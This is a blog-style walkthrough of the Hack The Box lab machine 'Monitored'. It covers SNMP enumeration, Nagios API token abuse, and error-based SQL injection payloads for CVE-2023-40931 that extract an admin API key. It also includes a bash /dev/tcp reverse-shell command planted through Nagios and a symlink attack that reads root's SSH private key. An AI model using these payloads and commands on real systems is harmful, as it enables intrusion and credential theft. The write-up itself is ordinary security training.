        <h1>Hack The Box: Monitored</h1>
        <h3>Feb 11 2025</h3>
        <p>Wanting a greater challenged, I've decided to take on my first medium-difficultly box in HTB. This one doesn't have many pwns, and has just turned a year old. The "About" section is as follows:</p>
        <p>"Monitored is a medium-difficulty Linux machine that features a Nagios instance. Credentials for the service are obtained via the SNMP protocol, which reveals a username and password combination provided as command-line parameters. Using the Nagios API, an authentication token for a disabled account is obtained, which leads to access to the application's dashboard. From there, a SQL injection (`[CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)`) is abused to obtain an administrator API key, with which a new admin account is created and used to run arbitrary commands on the instance, leading to a reverse shell. Finally, `sudo` access to a bash script is abused to read the `root` user's SSH key and authenticate as `root`."</p>
        <p>With that, I dive in.</p>
        <p>My first question is: what even is Nagios? I've read about it while skimming detali-sparse, generalized security articles, but I can't tell you what it is or why it's important. So, as any decent hacker should, I search for information.</p>
        <p>On its homepage: "Nagios is a powerful monitoring system that enables organizations to identify and resolve IT infrastructure problems before they affect critical business processes."</p>
        <p>Wow, that's really helpful.</p>
        <p>Scrolling down, I learn that Nagios is some kind of IT infrastructure monitoring software that ensures systems, applications, and services area functioning properly. When something goes wrong, Nagios is able to alert IT staff of the problem so that they can begin fixing whatever it is. This is important because intervening quickly can stop outages from being as impactful on customers and business processes.

Nagios has an open-source community that's contributed "thousands of plugins and add-ons", and Nagios projects can be used to build monitoring solutions.

So we have three individual Nagios projects: Nagios Core, Nagios Plugins, and Nagios Mod Gearman, each is distributed as part of the Nagios Core Services Platform (CSP) download for "ease of use" and rapid deployment. You download the Nagios CSP to get access to smart monitoring wizards, informative reports, and insightful dashboards. Interesting so far.

I'm going to take a look at Nagios Core's documentation, as it's described as a "monitoring engine" and just grabs my attention, for some reason.</p>
        <p>But wait! I don't want to get ahead of myself. I haven't even spawned the target machine yet, nor have I started my Kali VM. Let's do that, and run a reconnaissance scan afterwards to see what I can find.

I initiate the VPN connection, ping 10.129.230.96, and start formulating an Nmap scan so I can know what I'm working with. I run a basic `sudo nmap -sV -O -sC -T3 10.129.230.96` and as we can see, the host's name is nagios.monitored.htb and ports 22 (OpenSSH), 80 (HTTP), 389 (OpenLDAP), and 443 (HTTPS) are supposedly open. The web server is Apache version 2.4.56.

I also run a UDP scan, simply by appending `-sU` to the previous scan and running it again. UDP scans can take signicantly longer than other types, due to the nature of the protocol. It's connectionless, so Nmap doesn't receive an acknowledgement that the data has been received by the target unless the service on target port responds. Because of this, the state of the port cannot be immediately determined, which leads to longer wait times. 

So far, 6 minutes have gone by during this UDP scan. I hope it's worth it.

9 minutes down the drain...

11 minutes...

After like 20 minutes I've finally gotten my scan results back:</p>
        <p>On the UDP side of things, ports 68 (DHCP), 123 (NTP), 161 and 162 (SNMP) are open. We have a wealth of information about the SNMPv1 server likely due to an Nmap script used during the scan.

For some protocols, even port numbers are used to indicate client-side listening, and odd numbers are for server-side listening. The DHCP service is client-side listening. And if you didn't know already, DHCP is for automatically assigning IP addresses and other configuration parameters to devices on a network. The process of setting up and managing IP addresses is made easier by DHCP, because it dynamically allocates IP addresses as devices connect to the network. This is especially helpful in large networks, as manual IP address configuration would be time-consuming and more prone to errors. With DHCP, you don't have to worry about setting the IP address of a device, the protocol does it for you. DHCP handles the process by dynamically providing each device with not only an IP address, but also a subnet mask, default gateway, and other necessary network configuration settings.</p>
        <p>Connecting to http://10.129.230.96 gives me this web page:</p>
        <p>Per the "About" section of this box, SNMP is what I should be targeting next. What is SNMP anyway?

This protocol is used for sharing information among various devices on a network, regardless of their hardware or software. Architecturally, you have "managers" which are servers that collect and process information about devices on the network. Following managers are "agents", and they can be any type of device or device component that's connected to the network. They can be computers, phones, printers, network switches, etc. There's a data hierarchy within SNMP. It does in fact operate on a client-server model, but it also uses event-driven communication through SNMP traps or polling, which provide real-time updates about network events to management systems.

I noticed that SNMP exists on ports 161 AND 162. This is because manager devices using SNMP send requests to SNMP agents via 161. These requests range from commands to retrieve information to modifying device settings. 162 is used by the agents to send traps to managers. Traps alert managers to specific events or issues on the network device without the manager having to request the information. Both ports are essential for the functioning of SNMP.

Armed with that knowledge, I now seek to exploit SNMP. We know from the scan that the SNMP server could be v1, and that version happens to be relatively insecure. Communications between the manager and agent is plaintext, with SNMPv1. Apparently, v1 can only handle 32-bit counter values before rolling over. However, there's also a mention of SNMPv3 in the scan. I'm not sure how SNMPv1 and SNMPv3 are being used in relation to each other, if at all.

I turn to snmpwalk to retrieve management values. Snmpwalk does this by using SNMPGETNEXT requests to query devices on a network for information.

`snmpwalk -v2c -c public 10.129.230.96` to print a list of OIDs from the target device, where `-v2c` is for the SNMP version to use, `-c public` to specify the community string, followed by the target's IP address.

Snmpwalk returns a ton of output, some of which isn't very readable, as you can see:</p>
          <p>To make sense of this, I edit my host's snmp.conf in /etc/snmp/snmp.conf, making sure to uncomment `mibdirs' as shown:</p>
          <p>I love Vim!

`esc` then `:wq` to save and exit.

Now, I'm going to download snmp-mibs-downloader. It's designed for managing MIB (Management Information Base) files, so I'm going to need it shortly.

`apt search snmp-mibs`
`sudo apt install snmp-mibs-downloader`

I get "Package 'snmp-mibs-downloader' has no installation candidate", so I update my package list with `sudo apt update` and run the command again. The package is downloaded, and I now have the MIBS database. Back to the previous snmpwalk command, but this time I add `-m all`, so we'll get a much more useful input. Instead of just printing out random OIDs, we have now have information about them.

From snmpwalk's output, we get tons of information about packges on the target and processes running on the target. This information would probably be useful when trying to find alternative ways to exploit the machine. Better yet, a password can be found:</p>
           <p>Sadly, the login doesn't work, but not in the way you think:</p>
           <p>Entering any other combination results in "Invalid username or password", but here the panel tells me that the account has been disabled or doesn't exist. We know it existed at some point thanks to SNMP. I can probably interact with Nagios using some sort of API to get around this, so I start Burp Suite (cURL can also be used for this part, but Burp Suite is a little more intuitive).

HTB says that the API documentation for Nagios XI is weak, so I'll have to search forum posts or fuzz the API. But before that, I'm going to download FoxyProxy, which is an open-source proxy management tool. FoxyProxy switches your internet connection across one or more proxy servers using several possible methods chosen by the user. It's useful for debugging URL patterns, limiting IP address discovery by turning off WebRTC, etc. I'm going to use FoxyProxy with Burp to forward traffic to Burp, so that I can manipulate the web request before sending it to the web server.

To configure things, I go into FoxyProxy, add a new proxy, enter 127.0.0.1 in the Hostname field, and 8080 as the port number. I name the proxy "Burp" just to keep things organized. Now, I should be able to enable the proxy while Burp Suite is running. I make sure Intercept in Burp Suite is turned on, so that messages between my browser and the target web server are sent to the Proxy tab in Burp Suite. Here, we can analyze and modify messages before forwarding them.

In Burp, we can see the POST request. We have the ???

What I'm focused on is getting the token for authentication to the Nagios API. I send the request to the Repeater module of Burp, which you can see here:
</p>
           <p>I remove some uneeded information from the request:</p>
           <p>I then modify the request so that it's sent to `/nagiosxi/api/v1/authenticate` instead of /nagiosxi/login.php`. After forwarding this request to the server, a response is delivered within Burp. A nice token with which I can authenticate. :)

To start, I disable FoxyProxy, navigate back to the Nagios login panel, and modify the URL as follows: `https://10.129.230.96/nagiosxi/?token=69bf55e2b7a881f69ffa69ff63657a7c0a2b745d`...and I'm in! I've authenticated as the svc user despite the login panel telling me that the user was disabled/doesn't exist.

Snooping around, I found a page that monitors services and status information. At the bottom right of the web page is a service version number for Nagios XI, which is 5.11.0. A quick search for exploits relating to this version gives me CVE-2023-40931, an SQL injection exploit as mentioned by HTB. Very exciting!

So it reaches from 5.11.0 up to and including 5.11.1 according to NIST, and it allows authenticated attackers (such as myself ;)) to execute arbitrary SQL commands via the ID parameter in the POST request to `/nagiosxi/admin/banner_message-ajaxhelper.php`. Now, I'm going to take advantage of this.

First, I'm going to exploit this flaw manually.

I hop back into Burp and modify the request as follows:</p>
           <p>`POST /nagiosxi/api/v1/authenticate` becomes `POST /nagiosxi/admin/banner_message-ajaxhelper.php`.

`username=svc&password=XjH7VCehowpR1xZB` becomes `action=acknowledge_banner_message&id=EXPLOIT` ("EXPLOIT" is just filler text here). I send it and the server returns this:

So, I know for sure that an SQL injection problem exists here, but how do I actually extract important data from the server?

Sending `action=acknowledge_banner_message&id=1 AND EXTRACTVALUE(1,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA))` to the server results in the message:</p>
           <p></p>
           <p>Next is database enumeration. Sending `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))` gives me two databases in the response: "information_schema" and "nagiosxi". To access the columns, I use `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(TABLE_NAME,":",COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'nagiosxi')))`, which gives me a limited amount of information. Not enough that it's useful.

I then use `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'nagiosxi' LIMIT 0,1)))`, with this, I can go through a list of tables by modifying `LIMIT 0,1` to different numbers. For example: `LIMIT 0,1` returns `xi_deploy_agents` in the server response. `LIMIT 3,1` returns `xi_mibs` in the server response. `LIMIT 7,1` returns `xi_usermeta` in the server response. You get the idea.

This process can be sped up using the Intruder module of Burp. I send the Repeater request to Intruder using ctrl + I. Inside Intruder, the "0" in `LIMIT 0,1` will act as the 'payload' (denoted when between '§' symbols), and thus Intruder will automate the changing of 0 to other numbers so that we can speed up enumeration.

The payload type can be changed to numbers only under the "Payload type:" menu. I set the number range from 0 to 40 in the "Payload configuration" section. Then I start the attack.

When analyzing the results, I keep in mind that as an attacker, I'm hunting for the xi_users table, as that will contain an admin account. The 16th payload (`action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'nagiosxi' LIMIT 16,1)))`) gives us the response `SQL Error [nagiosxi] : XPATH syntax error: 'xi_users'` which tells me the name of the table that contains the information I need to find the API key for the admin user. I send this to the Repeater module.

Back to the Repeater module, I modify my request with `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'nagiosxi' and TABLE_NAME = 'xi_users' LIMIT 0,1)))`. Once again, I send this to the Intruder module so that I can check what the `xi_users` table contains this time around.

Among the requests, the ones that stand out to me are `username`, `password`, `api_key`!!!, and `api_enabled`. Now, to get the juicy data, I run modify my request to contain `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select username from xi_users LIMIT 0,1)))`, and from the server's response, I get `nagiosadmin`. Switching to `api_key`, I get `IudGPHd9pEKiee9MkJ7ggPD89q3Y...`. Darn! The full key isn't readable from here. I'm going to try finding a password to log in as nagiosadmin, and maybe a key is in there.</p>
           <p>Sadly, I can't get the full password hash:</p>
           <p>On a side note: `select username from xi_users LIMIT 1,1` reveals in the response the svc user I hijacked to log in.</p>
           <p>To get the full hashes, I can use `substring`. In the case of the API:</p>
           <p>`action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select substring(api_key,29,56) from xi_users LIMIT 0,1)))` will give us the next sequence of characters to combine with `IudGPHd9pEKiee9MkJ7ggPD89q3Y`. After combining each sequence, I should have the full hash. Logically, I move on to `57,150` to get the next sequence, giving me the last bit. The final hash is `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`!</p>
           <p>I now have to find an older exploit PoC that should tell me the API endpoint used for creating a new user in Nagios XI. In my search, I found CVE-2024-24401. The code should give me an idea of where to find the API and how to structure the parameters. I craft it as follows:</p>
           <p>Notice I pasted in the API key obtained earlier, and the bogus parameters stuffed into the request at the bottom.</p>
           <p>About auth_level: ???</p>
           <p>And with that, my account "hacker" was created, and now I can log in to Nagios XI at admin level. And...I'M IN!:</p>
           <p>(A terrible username if you're trying to remain undetected on the target, BTW.)

Just as I got admin access, the machine ran out of time. I start it again and it now has an IP address of 10.129.144.63. I now have to repeat some of the steps to get in again.

Ok, I'm back.

Here you can see the users. There's also a page ("Command Management") that lists commands, and allows the user to add new commands. Here I have the opportunity to plant a reverse shell on the host using `bash -c 'bash -i >& /dev/tcp/[attacker's IP]/9001 0>&1'`. By executing this, I should receive a TCP connection on port 9001 from the target machine. From there, I can execute desired commands.

I hit "Save", then apply the configuration with my reverse shell now included. Then, from the Core Config Manager, I select Services, add a new check, which is the reverse shell. Before hitting "Run Check Command", I create a TCP listener on my machine so that I can receive the reverse shell connection. It's as easy as `nc -lvnp 9001`, where `nc` is for netcat, the famous networking tool for reading and writing from TCP and UDP connections, `l` for listening for inbound connections, `v` for verbose mode (more information), `n` for numeric-only IP addresses, and `p` for the local port we want to listen on (9001 in this case).

BAM! I'm connected:</p>
           <p>The user flag is right there for me to take.

I use `sudo -l` to enumerate the sudo configuration for the nagios user. In other words, I'm finding out how many commands the nagios user can run as root with `sudo`, as you can see here:</p>
           <p>The `getprofile.sh` script itself collects and consolidates logs and configuration files into a profile directory that's specified by the user. The script expects either a directory name or identifier to store the profile. The danger here (for the target) is that the script is vulnerable to a symbolic link attack, meaning that a malicious user (me) could create a symbolic link (symlink) named phpmailer.log which points to a sensitive file. This is dangerous because, when the script executes, it'd follow the symlink and copy sensitive data into an accessible directory. I verify access to the phpmailer.log so that I can execute the symbolic link attack:</p>
           <p>The log file doesn't currently exist, but I have write permissions to its parent directory. I proceed to check the SSH configuration to see if authentication as root is enabled, and also if PubkeyAuthentication is enabled. PubkeyAuthentication specifies whether public key authentication is allowed or not, and the default is yes.

If the user has a private key in their .ssh directory, I can use it to authenticate.

As for actually exploiting this scenario, I start by creating the symlink named `phpmailer.log` in the /usr/local/nagiosxi/tmp/ directory:

`ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log`

`ln` is the link command in Linux, and it creates links between files. By default, `ln` creates hard links, but by using the `-s` option, symbolic (soft) links can be created. As stated, the `-s` flag tells `ln` to create a symbolic (soft) link. For context, a symbolic link is similar to a shortcut or alias to another file or directory. The actual content is not copied; the symbolic link just points to the original location.

`/root/.ssh/id_rsa` is the source file. In this case, it points to the private SSH key file (`id_rsa`), which is located in the `.ssh` directory under the root user's home directory (`/root/.ssh/`). `id_rsa` is a private key used for SSH authentication. The destination path is `/usr/local/nagiosxi/tmp/phpmailer.log`, so the symbolic link is being created at that location. So, the symbolic link will appear as `phpmailer.log` in that directory, but it'll actually point to the `id_rsa` file.

The command will allow me to reference a different file (the SSH private key), using the symbolic link. This is a nice method for privilege escalation.

I run the script using `sudo ./getprofile.sh 1`, which follows the malicious symlink and copies the contents of root's SSH private key into the profile folder I control. In this case, profile-1739325883:</p>
           <p>I cd into profile-1739325883, list the contents, and `cat phpmailer.log`, where the maliciously-gotten private key is stored. I save it to my machine as `id_rsa`, apply 600 permissions to the file using `chmod 600 id_rsa`, and finally break into the Monitored box as root, where the last flag is located. Why 600? Well, with the command, I'm modifying the file permissions 

This was an extremely fun—at times utterly frustrating box—to complete. I wanted more of a challenge and I got exactly that and more.

With that out of the way, I wanted to take this opportunity to practice automatic SQLi using sqlmap, so I'm going to rewind to the part where I'm trying to get the API key.</p>
